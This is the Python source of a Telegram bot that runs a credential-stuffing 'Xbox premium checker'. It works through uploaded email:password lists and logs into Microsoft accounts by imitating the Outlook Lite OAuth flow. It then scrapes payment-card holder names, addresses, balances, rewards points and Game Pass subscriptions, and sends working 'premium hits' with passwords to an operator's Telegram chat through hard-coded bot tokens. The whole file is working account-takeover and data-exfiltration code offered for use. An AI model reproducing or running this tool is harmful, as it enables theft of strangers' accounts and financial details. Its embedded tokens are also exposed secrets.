import os
import sys
import time
import threading
import queue
import asyncio
import tempfile
import shutil
import traceback
import json
import uuid
import re
from datetime import datetime, timedelta
from pathlib import Path
from threading import Lock
from urllib.parse import quote, unquote

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ============================================================
# TELEGRAM CONFIGURATION
# ============================================================

# MAIN BOT (User interacts with this bot)
TELEGRAM_BOT_TOKEN_MAIN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"

# PREMIUM BOT (Only receives premium hit messages)
TELEGRAM_BOT_TOKEN_PREMIUM = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"

# Your Telegram Chat ID
TELEGRAM_CHAT_ID = "8260250818"

class TelegramSender:
    def __init__(self):
        self.base_url_main = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_MAIN}"
        self.base_url_premium = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_PREMIUM}"
    
    def send_premium_hit(self, email, password, data):
        """Send premium hit with AESTHETIC format to BOTH bots"""
        message = self.format_aesthetic_hit(email, password, data)
        
        def _send_to_main():
            try:
                url = f"{self.base_url_main}/sendMessage"
                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": None}
                requests.post(url, data=payload, timeout=10)
                print(f"[✓] Premium hit sent to MAIN bot")
            except Exception as e:
                print(f"[✗] Main bot error: {e}")
        
        def _send_to_premium():
            try:
                url = f"{self.base_url_premium}/sendMessage"
                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": None}
                requests.post(url, data=payload, timeout=10)
                print(f"[✓] Premium hit sent to PREMIUM bot")
            except Exception as e:
                print(f"[✗] Premium bot error: {e}")
        
        # Send to both bots
        t1 = threading.Thread(target=_send_to_main, daemon=True)
        t2 = threading.Thread(target=_send_to_premium, daemon=True)
        t1.start()
        t2.start()
    
    def format_aesthetic_hit(self, email, password, data):
        """Format premium hit with the requested aesthetic style"""
        premium_type = data.get('premium_type', 'PREMIUM')
        country = data.get('country', 'N/A')
        days = data.get('days_remaining', '0')
        auto_renew = data.get('auto_renew', 'NO')
        renewal_date = data.get('renewal_date', 'N/A')
        total_amount = data.get('total_amount', '0')
        currency = data.get('currency', 'USD')
        
        # Format renewal display
        if renewal_date != 'N/A' and renewal_date:
            try:
                renewal_obj = datetime.fromisoformat(renewal_date)
                renewal_formatted = renewal_obj.strftime('%b %d, %Y')
            except:
                renewal_formatted = renewal_date
        else:
            renewal_formatted = 'N/A'
        
        # Build the aesthetic message exactly as requested
        message = (
            f"🧎̻🧎̻  🎮🎀\n"
            f"🌷 {email} 🌷 🔐 {password}\n"
            f"🌸 {premium_type} ({country}) ⏳ {days} days 🔁 Renews {renewal_formatted} 💸 ${total_amount} {currency}\n"
            f"🧎̻ ✧♡\n"
            f"✨ 𝒂𝒊 @StarLuxHub ✨"
        )
        
        return message

# ============================================================
# WORKING XBOX CHECKER (COMPLETELY UNMODIFIED)
# ============================================================

class XboxChecker:
    def __init__(self, debug=False):
        self.debug = debug
        
    def log(self, message):
        if self.debug:
            print("[DEBUG] " + message)
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def check(self, email, password):
        try:
            self.log("Checking: " + email)
            
            session = requests.Session()
            correlation_id = str(uuid.uuid4())
            
            # Step 1: IDP Check
            self.log("Step 1: IDP check...")
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = session.get(url1, headers=headers1, timeout=15)
            self.log("IDP Response: " + str(r1.status_code))
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                self.log("IDP check failed")
                return {"status": "BAD", "data": {}}
            
            if "MSAccount" not in r1.text:
                self.log("MSAccount not found")
                return {"status": "BAD", "data": {}}
            
            self.log("IDP check success")
            
            # Step 2: OAuth authorize
            self.log("Step 2: OAuth authorize...")
            time.sleep(0.5)
            
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                self.log("PPFT or URL not found")
                return {"status": "BAD", "data": {}}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            self.log("PPFT found: " + ppft[:30] + "...")
            
            # Step 3: Login POST
            self.log("Step 3: Login POST...")
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            self.log("Login Response: " + str(r3.status_code))
            
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                self.log("Bad credentials")
                return {"status": "BAD", "data": {}}
            
            if "https://account.live.com/identity/confirm" in r3.text:
                self.log("2FA required")
                return {"status": "2FACTOR", "data": {}}
            
            if "https://account.live.com/Abuse" in r3.text:
                self.log("Account banned")
                return {"status": "BANNED", "data": {}}
            
            location = r3.headers.get("Location", "")
            if not location:
                self.log("Redirect location not found")
                return {"status": "BAD", "data": {}}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                self.log("Auth code not found")
                return {"status": "BAD", "data": {}}
            
            code = code_match.group(1)
            self.log("Auth code obtained: " + code[:30] + "...")
            
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("CID not found")
                return {"status": "BAD", "data": {}}
            
            cid = mspcid.upper()
            self.log("CID: " + cid)
            
            # Step 4: Get access token
            self.log("Step 4: Getting token...")
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                            data=token_data, 
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=15)
            
            if "access_token" not in r4.text:
                self.log("Access token not obtained")
                return {"status": "BAD", "data": {}}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            self.log("Token obtained")
            
            # Step 5: Get profile info
            self.log("Step 5: Getting profile info...")
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }
            
            country = ""
            name = ""
            
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                                headers=profile_headers, timeout=15)
                
                if r5.status_code == 200:
                    profile = r5.json()
                    
                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")
                    
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
                    
                    self.log("Profile: Name=" + name + " | Country=" + country)
            except Exception as e:
                self.log("Profile error: " + str(e))
            
            # Step 6: Get Xbox payment token
            self.log("Step 6: Getting Xbox payment token...")
            time.sleep(0.5)
            
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            # Extract payment token
            payment_token = None
            search_text = r6.text + " " + r6.url
            
            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token:
                self.log("Payment token not obtained - FREE")
                return {"status": "FREE", "data": {"country": country, "name": name}}
            
            self.log("Payment token obtained")
            
            # Step 7: Check payment instruments
            self.log("Step 7: Checking payment instruments...")
            
            payment_data = {"country": country, "name": name}
            subscription_data = {}
            
            correlation_id2 = str(uuid.uuid4())
            
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                
                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)
                    
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
                    
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
                    
                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)
                    
                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except Exception as e:
                self.log("Payment instruments error: " + str(e))
            
            # Step 8: Get Bing Rewards
            try:
                rewards_r = session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    payment_data['rewards_points'] = points_match.group(1)
            except:
                pass
            
            # Step 9: Check subscription
            self.log("Step 9: Checking subscription...")
            
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                
                if r8.status_code == 200:
                    response_text = r8.text
                    
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }
                    
                    has_premium = False
                    premium_type = "FREE"
                    
                    for keyword, type_name in premium_keywords.items():
                        if keyword in response_text:
                            has_premium = True
                            premium_type = type_name
                            break
                    
                    if has_premium:
                        title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
                        if title_match:
                            subscription_data['title'] = title_match.group(1)
                        
                        start_match = re.search(r'"startDate"\s*:\s*"([^T"]+)', response_text)
                        if start_match:
                            subscription_data['start_date'] = start_match.group(1)
                        
                        renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                        if renewal_match:
                            renewal_date = renewal_match.group(1)
                            subscription_data['renewal_date'] = renewal_date
                            subscription_data['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")
                        
                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                        
                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)
                        
                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)
                        
                        if not payment_data.get('country'):
                            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', response_text)
                            if country_match:
                                payment_data['country'] = country_match.group(1)
                        
                        subscription_data['premium_type'] = premium_type
                        subscription_data['has_premium'] = True
                        
                        days_rem = subscription_data.get('days_remaining', '0')
                        if days_rem.startswith('-'):
                            self.log("Subscription expired")
                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}
                        
                        self.log("Premium found: " + premium_type)
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        self.log("No subscription - FREE")
                        return {"status": "FREE", "data": payment_data}
            except Exception as e:
                self.log("Subscription error: " + str(e))
                return {"status": "FREE", "data": payment_data}
            
            return {"status": "FREE", "data": {**payment_data, **subscription_data}}
            
        except requests.exceptions.Timeout:
            self.log("Timeout")
            return {"status": "TIMEOUT", "data": {}}
        except Exception as e:
            self.log("Exception: " + str(e))
            return {"status": "ERROR", "data": {}}

# ============================================================
# RAILWAY TELEGRAM BOT - RUNS ON MAIN BOT
# ============================================================

# Application runs on MAIN bot token
BOT_TOKEN = TELEGRAM_BOT_TOKEN_MAIN
MAX_CONCURRENT_WORKERS = 20

task_queue = queue.Queue()
active_tasks = {}
active_tasks_lock = threading.Lock()
loop = None
app = None

class ScanTask:
    def __init__(self, file_path, original_name, file_id, chat_id):
        self.file_path = file_path
        self.original_name = original_name
        self.file_id = file_id
        self.chat_id = chat_id
        self.created_at = datetime.now()
        self.status = "pending"

def process_single_file(task):
    try:
        with open(task.file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if not lines:
            asyncio.run_coroutine_threadsafe(send_error_message(task, "No valid account lines found"), loop)
            return
        
        stats = {"total": len(lines), "checked": 0, "premium": 0, "free": 0, "bad": 0, "expired": 0, "banned": 0, "two_factor": 0, "timeout": 0, "error": 0}
        premium_results = []
        batch_buffer = []
        BATCH_SIZE = 15
        
        checker = XboxChecker(debug=False)
        telegram_sender = TelegramSender()
        
        for idx, line in enumerate(lines, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                result = checker.check(email, password)
                status = result['status']
                data = result.get('data', {})
                
                result_entry = f"{email}:{password}"
                
                if status == "PREMIUM":
                    stats["premium"] += 1
                    premium_results.append((email, password, data))
                    premium_type = data.get('premium_type', 'GAME PASS')
                    days = data.get('days_remaining', '0')
                    result_entry += f" ✅ PREMIUM | {premium_type} | {days} days"
                    batch_buffer.append(result_entry)
                    
                    # Send premium hit with AESTHETIC format to BOTH bots
                    try:
                        telegram_sender.send_premium_hit(email, password, data)
                        print(f"🎯 PREMIUM HIT: {email} | Sent with aesthetic format")
                    except Exception as e:
                        print(f"Failed to send premium hit: {e}")
                        
                elif status == "FREE":
                    stats["free"] += 1
                    country = data.get('country', 'N/A')
                    result_entry += f" 🆓 FREE | Country: {country}"
                    batch_buffer.append(result_entry)
                elif status == "EXPIRED":
                    stats["expired"] += 1
                    stats["bad"] += 1
                    result_entry += f" ⏰ EXPIRED"
                    batch_buffer.append(result_entry)
                elif status == "BANNED":
                    stats["banned"] += 1
                    stats["bad"] += 1
                    result_entry += f" 🚫 BANNED"
                    batch_buffer.append(result_entry)
                elif status == "2FACTOR":
                    stats["two_factor"] += 1
                    stats["bad"] += 1
                    result_entry += f" 🔐 2FA REQUIRED"
                    batch_buffer.append(result_entry)
                elif status == "TIMEOUT":
                    stats["timeout"] += 1
                    stats["bad"] += 1
                    result_entry += f" ⏱️ TIMEOUT"
                    batch_buffer.append(result_entry)
                elif status == "ERROR":
                    stats["error"] += 1
                    stats["bad"] += 1
                    result_entry += f" ⚠️ CHECKER ERROR"
                    batch_buffer.append(result_entry)
                else:
                    stats["bad"] += 1
                    result_entry += f" ❌ BAD CREDENTIALS"
                    batch_buffer.append(result_entry)
                
                stats["checked"] += 1
                
                if len(batch_buffer) >= BATCH_SIZE:
                    asyncio.run_coroutine_threadsafe(send_batch_update(task, batch_buffer.copy(), stats), loop)
                    batch_buffer.clear()
                
                time.sleep(0.5)
                
            except Exception as e:
                stats["error"] += 1
                stats["bad"] += 1
                stats["checked"] += 1
                batch_buffer.append(f"{line[:50]}... ⚠️ ERROR: {str(e)[:30]}")
                if len(batch_buffer) >= BATCH_SIZE:
                    asyncio.run_coroutine_threadsafe(send_batch_update(task, batch_buffer.copy(), stats), loop)
                    batch_buffer.clear()
        
        if batch_buffer:
            asyncio.run_coroutine_threadsafe(send_batch_update(task, batch_buffer.copy(), stats), loop)
        
        premium_text = "\n".join([f"{e}:{p} | {d.get('premium_type', 'UNKNOWN')} | {d.get('days_remaining', '0')} days" for e, p, d in premium_results[:50]])
        asyncio.run_coroutine_threadsafe(send_final_results(task, stats, premium_text), loop)
        
    except Exception as e:
        asyncio.run_coroutine_threadsafe(send_error_message(task, str(e)), loop)
    finally:
        with active_tasks_lock:
            if task.file_id in active_tasks:
                del active_tasks[task.file_id]
        if task.file_path and os.path.exists(task.file_path):
            try:
                shutil.rmtree(os.path.dirname(task.file_path))
            except:
                pass

def worker_loop():
    while True:
        try:
            with active_tasks_lock:
                current_active = len(active_tasks)
            if current_active >= MAX_CONCURRENT_WORKERS:
                time.sleep(0.3)
                continue
            try:
                task = task_queue.get(timeout=1)
            except queue.Empty:
                time.sleep(0.5)
                continue
            with active_tasks_lock:
                active_tasks[task.file_id] = task
            asyncio.run_coroutine_threadsafe(send_processing_start(task), loop)
            thread = threading.Thread(target=process_single_file, args=(task,))
            thread.daemon = True
            thread.start()
        except Exception as e:
            print(f"Worker error: {e}")
            time.sleep(1)

async def send_processing_start(task):
    msg = f"🚀 **XBOX CHECKER STARTED**\n\n📄 `{task.original_name}`\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}"
    await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=msg, parse_mode=ParseMode.MARKDOWN)

async def send_batch_update(task, batch_results, stats):
    progress = f"📊 **File:** `{task.original_name}`\n📈 **Progress:** {stats['checked']}/{stats['total']}\n✅ **Premium:** {stats['premium']} | 🆓 **Free:** {stats['free']} | ❌ **Bad:** {stats['bad']}\n\n"
    results_text = "\n".join(batch_results[:25])
    if len(batch_results) > 25:
        results_text += f"\n... and {len(batch_results) - 25} more"
    message = progress + "```\n" + results_text + "\n```"
    try:
        await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=message, parse_mode=ParseMode.MARKDOWN)
    except:
        await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=progress, parse_mode=ParseMode.MARKDOWN)

async def send_final_results(task, stats, premium_text):
    receipt = (f"✅ **SCAN COMPLETE**\n\n📄 **File:** `{task.original_name}`\n⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f}s\n\n"
               f"📊 **FINAL RESULTS**\n━━━━━━━━━━━━━━━━━━━━\n🔢 Total: `{stats['total']}`\n✅ PREMIUM: `{stats['premium']}`\n"
               f"🆓 FREE: `{stats['free']}`\n❌ BAD: `{stats['bad']}`\n━━━━━━━━━━━━━━━━━━━━\n")
    await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=receipt, parse_mode=ParseMode.MARKDOWN)
    if stats['premium'] > 0 and premium_text:
        await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:4000]}\n```", parse_mode=ParseMode.MARKDOWN)
    with active_tasks_lock:
        remaining = task_queue.qsize()
    if remaining > 0:
        await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=f"📁 {remaining} file(s) still in queue...", parse_mode=ParseMode.MARKDOWN)

async def send_error_message(task, error):
    await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=f"❌ **ERROR**\n\n📄 `{task.original_name}`\n`{error[:500]}`", parse_mode=ParseMode.MARKDOWN)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = ("🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
           f"⚡ **Concurrent Workers:** {MAX_CONCURRENT_WORKERS}\n"
           f"✅ **Checker:** WORKING XBOX CHECKER\n"
           f"📨 **Premium Hits:** Aesthetic format with special characters\n"
           f"🤖 **Main Bot:** `8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0`\n"
           f"🤖 **Premium Bot:** `8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA`\n\n"
           "Send a `.txt` file with `email:password` format\n\n"
           "**Commands:**\n/start - This message\n/status - Queue status")
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with active_tasks_lock:
        active_count = len(active_tasks)
        queue_size = task_queue.qsize()
    msg = f"📊 **QUEUE STATUS**\n\n⚡ **Active Workers:** {active_count}/{MAX_CONCURRENT_WORKERS}\n⏳ **Queue Size:** {queue_size}\n🔄 **Processing:** {'Yes' if active_count > 0 else 'No'}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file.")
        return
    file = await context.bot.get_file(document.file_id)
    temp_dir = tempfile.mkdtemp()
    temp_path = os.path.join(temp_dir, document.file_name)
    await file.download_to_drive(temp_path)
    try:
        with open(temp_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        valid_count = len(lines)
    except:
        valid_count = 0
    if valid_count == 0:
        await update.message.reply_text(f"❌ **FILE REJECTED**\n\n📄 `{document.file_name}`\nNo valid lines.", parse_mode=ParseMode.MARKDOWN)
        shutil.rmtree(temp_dir)
        return
    task = ScanTask(file_path=temp_path, original_name=document.file_name, file_id=document.file_id, chat_id=update.effective_chat.id)
    task_queue.put(task)
    with active_tasks_lock:
        queue_size = task_queue.qsize()
        active_count = len(active_tasks)
    await update.message.reply_text(f"✅ **File Accepted**\n\n📄 `{document.file_name}`\n🔢 Accounts: `{valid_count}`\n⚡ Active: {active_count}/{MAX_CONCURRENT_WORKERS}\n📊 Queue: {queue_size}\n\n🎯 **Premium hits use aesthetic format!**", parse_mode=ParseMode.MARKDOWN)

def main():
    global app, loop
    app = Application.builder().token(BOT_TOKEN).build()
    loop = asyncio.get_event_loop()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    for _ in range(MAX_CONCURRENT_WORKERS):
        threading.Thread(target=worker_loop, daemon=True).start()
    print("=" * 60)
    print("🎮 XBOX PREMIUM CHECKER - AESTHETIC HIT FORMAT")
    print("=" * 60)
    print(f"✅ MAIN BOT: {TELEGRAM_BOT_TOKEN_MAIN}")
    print(f"✅ PREMIUM BOT: {TELEGRAM_BOT_TOKEN_PREMIUM}")
    print(f"✅ Chat ID: {TELEGRAM_CHAT_ID}")
    print(f"⚡ Concurrent Workers: {MAX_CONCURRENT_WORKERS}")
    print(f"✨ Premium hit format:")
    print(f"   🧎̻🧎̻  🎮🎀")
    print(f"   🌷 email 🌷 🔐 password")
    print(f"   🌸 PLAN (COUNTRY) ⏳ days 🔁 Renews DATE 💸 $amount")
    print(f"   🧎̻ ✧♡")
    print(f"   ✨ 𝒂𝒊 @StarLuxHub ✨")
    print("=" * 60)
    app.run_polling()

if __name__ == "__main__":
    main()
